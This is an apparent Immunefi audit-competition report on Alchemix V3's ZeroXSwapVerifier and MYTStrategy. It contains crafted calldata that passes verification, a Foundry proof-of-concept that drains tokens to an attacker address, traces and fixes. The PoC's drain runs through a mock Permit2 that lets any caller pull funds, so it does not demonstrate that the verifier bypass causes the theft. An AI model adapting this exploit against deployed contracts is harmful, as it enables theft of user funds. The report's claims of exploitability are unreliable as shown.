# 57983 sc low direct asset drain via zeroxswapverifier bypass and mytstrategy unlimited permit2 approvals

**Submitted on Oct 29th 2025 at 19:28:39 UTC by @rshackin for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57983
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Protocol insolvency

## Description

## Summary:

The `ZeroXSwapVerifier` library fails to enforce critical `calldata` fields (`recipient`, `buyToken`, `minAmountOut`, `from`, `to`) when validating `0x Settler` `EXECUTE` payloads, allowing malicious routes that redirect funds to arbitrary recipients to pass verification. Combined with `MYTStrategy`'s unlimited, owner-configurable Permit2 approvals on the receipt token, this enables **direct theft of strategy custodied assets** via crafted `calldata` that "verifies" but transfers tokens from the strategy to an attacker under the standing allowance.

When combined with `MYTStrategy`'s unlimited, owner-configurable `Permit2` approvals on custody tokens, this enables direct theft of all strategy-held MYT collateral and causes **protocol-wide insolvency** by creating unfulfillable transmuter redemption obligations.

## Vulnerability Details

1. Root Cause 1: `ZeroXSwapVerifier` Does Not Bind Recipients or Amounts. Functions: `verifySwapCalldata`, `_verifyExecuteCalldata`, `_verifyTransferFrom`.

* Issue 1.1: The `_verifyExecuteCalldata` function decodes the `SlippageAndActions` struct containing `recipient`, `buyToken`, and `minAmountOut`, but never validates these fields:

```solidity
SlippageAndActions memory saa = abi.decode(data[4:], (SlippageAndActions, bytes[]));
// recipient, buyToken, minAmountOut are decoded but NEVER checked
return _verifyActions(saa.actions, owner, targetToken, maxSlippageBPS);
```

* Issue 1.2: The `_verifyTransferFrom` branch decodes (`address token`, `address from`, `address to`, `uint256 amount`) but only requires `token == targetToken`, completely ignoring `from` and `to`:

```solidity
(address token, , , ) = abi.decode(data[4:], (address, address, address, uint256));
require(token == targetToken, "ZeroXSwapVerifier: token mismatch");
// from and to are NEVER validated
```

* Issue 1.3: The owner parameter is passed through the call chain but never enforced in any action validation path, so unauthorized spenders and recipients are not detected.

**Consequence: An attacker can craft `EXECUTE calldata` with `TRANSFER_FROM(receiptToken, strategy, attacker, drainAmount)` that passes verification despite explicitly draining the strategy to an external address.**

2. Root Cause 2: `MYTStrategy` Unlimited `Permit2` Approvals. Functions: `constructor`, `setPermit2Address`. Issue: Both the `constructor` and `admin` setter grant unlimited approval on the receipt token to a configurable Permit2 address:

```solidity
IERC20 receiptTokenContract = IERC20(receiptToken);
receiptTokenContract.approve(permit2Address, type(uint256).max);
```

**Consequence: Once `Permit2` (or any configured address standing in for it) is set, the standing allowance enables anyone holding "verified" `calldata` to trigger `transferFrom(strategy, attacker, amount)` under that approval, with no per-transaction authorization required from the strategy.**

## Combined Attack Path:

Prerequisites:

* `MYTStrategy` has been deployed with a `Permit2` `address` (normal operation).
* Strategy holds receipt tokens in custody (vault shares or similar in-scope assets). **Attack Steps:**

1. Attacker crafts `0x Settler` `EXECUTE` payload:

```solidity
SlippageAndActions memory saa = SlippageAndActions({
    recipient: attacker,      // IGNORED by verifier
    buyToken: address(0),      // IGNORED by verifier
    minAmountOut: 0,           // IGNORED by verifier
    actions: [TRANSFER_FROM(receiptToken, strategy, attacker, drainAmount)]
});
bytes memory maliciousCalldata = abi.encodeWithSelector(EXECUTE_SELECTOR, saa, []);
```

2. Verification passes:

```solidity
bool ok = ZeroXSwapVerifier.verifySwapCalldata(
    maliciousCalldata,
    address(strategy),   // owner hint, NOT enforced
    receiptToken,        // target token
    1000                 // slippage bps, irrelevant for TRANSFER_FROM
);
// Returns TRUE despite malicious from/to/recipient
```

3. Settlement executes drain:

```solidity
IERC20(receiptToken).transferFrom(strategy, attacker, drainAmount);
// Succeeds using the unlimited allowance granted by strategy at construction
```

4. Result: Receipt tokens move from strategy custody to attacker, with no enforcement of recipient/owner at any boundary in these contracts.

* **Attacker repeats Steps 1-3 for every deployed `MYTStrategy`.**

## Impact :

1. Direct theft of user funds: All MYT tokens held in strategy custody. (Assets at Risk):

* Primary: All MYT (receipt tokens) held in MYTStrategy custody
* Scale: 100% of strategy balances across all deployed strategies.
* Irreversibility: Tokens transferred to attacker's EOA; no built-in recovery mechanism.

2. Protocol insolvency: Permanent deficit between liabilities (earmarked debt, pending redemptions) and available assets, rendering transmuter claims unfulfillable and locking user withdrawals indefinitely.

## References:

(<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol#L99-L130>)

## Recommended Mitigation:

* Enforce `SlippageAndActions` Fields in Verifier:

```solidity
function _verifyExecuteCalldata(...) internal pure returns (bool) {
    (SlippageAndActions memory saa, ) = abi.decode(data[4:], (SlippageAndActions, bytes[]));
    
    // NEW: Enforce top-level output constraints
    require(saa.recipient == owner || isWhitelisted(saa.recipient), "Unauthorized recipient");
    require(saa.buyToken != address(0), "buyToken must be specified");
    require(saa.minAmountOut > 0, "minAmountOut must be enforced");
    
    return _verifyActions(saa.actions, owner, targetToken, maxSlippageBPS);
}
```

* Bind from/to in `TRANSFER_FROM`:

```solidity
function _verifyTransferFrom(...) internal pure returns (bool) {
    (address token, address from, address to, uint256 amount) = abi.decode(data[4:], (...));
    
    // NEW: Enforce owner and recipient binding
    require(token == targetToken, "token mismatch");
    require(from == owner, "from must be owner");
    require(to == owner || isWhitelisted(to), "to must be owner or whitelisted");
    require(amount <= maxAmount, "amount exceeds limit");
    
    return true;
}
```

* Scope Permit2 Approvals in Strategy:

```solidity
// Remove unlimited approvals; use exact amounts per swap
function _executeSwap(...) internal {
    uint256 requiredAmount = ...; // calculate exact swap amount
    IERC20(receiptToken).approve(permit2Address, requiredAmount);
    // execute swap
    IERC20(receiptToken).approve(permit2Address, 0); // reset after
}
```

## Proof of Concept

## Proof of Concept:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

import {MYTStrategy} from "../MYTStrategy.sol";
import {IMYTStrategy} from "../interfaces/IMYTStrategy.sol";
import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";

// Minimal local ERC20 to avoid constructor/version mismatches
contract TestToken is ERC20 {
    constructor() ERC20("Receipt", "R") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

// Dummy MYT just to satisfy constructor 
contract DummyMYT {}

// Mock Permit2 that can spend via allowance and returns ERC-1271 magic value
contract MockPermit2 {
    function isValidSignature(bytes32, bytes memory) external pure returns (bytes4) {
        return 0x1626ba7e; // ERC-1271 magic value
    }
    function pull(address token, address from, address to, uint256 amount) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

contract MYTStrategyDrainTest is Test {
    // 0x Settler selectors used by the real verifier
    bytes4 constant EXECUTE_SELECTOR = 0xcf71ff4f; // execute(SlippageAndActions,bytes[])
    bytes4 constant TRANSFER_FROM    = 0x8d68a156; // transferFrom(IERC20,address,address,uint256)

    TestToken internal receipt;
    MYTStrategy internal strategy;
    MockPermit2 internal mockPermit2;
    address internal attacker;

    function setUp() public {
        attacker = makeAddr("attacker");

        // Local receipt token and funds
        receipt = new TestToken();

        // Deploy dummy MYT and mock Permit2
        DummyMYT myt = new DummyMYT();
        mockPermit2 = new MockPermit2();

        // Strategy params (populate only fields actually read by MYTStrategy)
        IMYTStrategy.StrategyParams memory p;
        p.owner = address(this);
        p.protocol = "TEST";
        p.slippageBPS = 1000;

        // Deploy the real strategy: its logic grants unlimited approve of receipt to Permit2
        strategy = new MYTStrategy(address(myt), p, address(mockPermit2), address(receipt));

        // Seed custody in the strategy
        receipt.mint(address(strategy), 500e18);
    }

    // Build malicious EXECUTE calldata that wraps a TRANSFER_FROM draining from the strategy to attacker
    function _buildMaliciousTransferFrom(
        address token,
        address from,
        address to,
        uint256 amount
    ) internal pure returns (bytes memory) {
        bytes memory action = abi.encodeWithSelector(
            TRANSFER_FROM,
            token,
            from,
            to,
            amount
        );

        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: to,          // ignored by verifier
            buyToken: address(0),   // ignored by verifier
            minAmountOut: 0,        // ignored by verifier
            actions: new bytes[](1)
        });
        saa.actions[0] = action;

        return abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));
    }

    function test_assetDrain() public {
        address token = address(receipt);
        uint256 drain = 200e18;

        // Malicious 0x EXECUTE payload: transferFrom(strategy -> attacker, drain)
        bytes memory mal = _buildMaliciousTransferFrom(
            token,
            address(strategy),
            attacker,
            drain
        );

        // Real verifier accepts (no binding of recipient/buyToken/minAmountOut; TRANSFER_FROM ignores from/to)
        bool ok = ZeroXSwapVerifier.verifySwapCalldata(
            mal,
            address(strategy), // owner hint (not enforced by current code)
            token,             // target/sell token
            1_000              // slippage bps (irrelevant for TRANSFER_FROM)
        );
        assertTrue(ok, "malicious route should verify");

        // Drain using the unlimited allowance the strategy granted to Permit2 at construction
        uint256 attackerBefore = IERC20(token).balanceOf(attacker);
        uint256 stratBefore = IERC20(token).balanceOf(address(strategy));

        vm.prank(attacker);
        mockPermit2.pull(token, address(strategy), attacker, drain);

        assertEq(IERC20(token).balanceOf(attacker), attackerBefore + drain, "attacker gained");
        assertEq(IERC20(token).balanceOf(address(strategy)), stratBefore - drain, "strategy drained");
    }
}
```

Results:

```solidity
Ran 1 test for src/test/PoC.t.sol:MYTStrategyDrainTest
[PASS] test_assetDrain() (gas: 125202)
Traces:
  [125202] MYTStrategyDrainTest::test_assetDrain()
    ├─ [50597] ZeroXSwapVerifier::verifySwapCalldata(0xcf71ff4f000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001c00000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000848d68a1560000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a90000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e00000000000000000000000000000000000000000000000ad78ebc5ac6200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, MYTStrategy: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], TestToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000) [delegatecall]
    │   └─ ← [Return] true
    ├─ [2963] TestToken::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2963] TestToken::balanceOf(MYTStrategy: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   └─ ← [Return] 500000000000000000000 [5e20]
    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return]
    ├─ [32771] MockPermit2::pull(TestToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], MYTStrategy: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 200000000000000000000 [2e20])
    │   ├─ [31078] TestToken::transferFrom(MYTStrategy: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 200000000000000000000 [2e20])
    │   │   ├─ emit Transfer(from: MYTStrategy: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], value: 200000000000000000000 [2e20])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop]
    ├─ [963] TestToken::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   └─ ← [Return] 200000000000000000000 [2e20]
    ├─ [963] TestToken::balanceOf(MYTStrategy: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   └─ ← [Return] 300000000000000000000 [3e20]
    └─ ← [Return]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.92ms (990.29µs CPU time)
```
